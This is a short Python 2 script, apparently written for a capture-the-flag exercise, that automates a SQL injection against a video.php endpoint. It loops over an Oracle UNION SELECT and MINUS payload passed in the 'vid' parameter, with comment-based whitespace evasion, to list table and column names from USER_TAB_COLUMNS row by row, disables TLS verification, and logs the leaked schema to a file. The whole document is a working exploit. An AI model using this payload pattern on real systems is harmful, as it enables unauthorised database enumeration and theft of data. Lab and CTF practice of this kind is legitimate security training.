import requests
import os
import threading
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


my_params = {'vid': ' '}
s1 = "(-1)/**/UNION/**/SELECT/**/NULL,TABLE_NAME||1||COLUMN_NAME,NULL/**/FROM/**/USER_TAB_COLUMNS/**/WHERE/**/ROWNUM/**/</**/"
s2 = "/**/MINUS/**/SELECT/**/NULL,TABLE_NAME||1||COLUMN_NAME,NULL/**/FROM/**/USER_TAB_COLUMNS/**/WHERE/**/ROWNUM/**/</**/"

fp = open("filename.txt", "a")
number = 0
while(1):
    my_params['vid'] = s1+str(number+1)+s2+str(number)
    b = requests.get('https://edu-ctf.csie.org:10159/video.php', params = my_params , verify = False , allow_redirects=False)
    #print b.url
    fp.write(b.text[2227:2290].split("\n")[0][:-5]+"\n")
    print b.text[2227:2290].split("\n")[0][:-5]
    number = number +1
    print number
    fp.write(str(number)+"\n")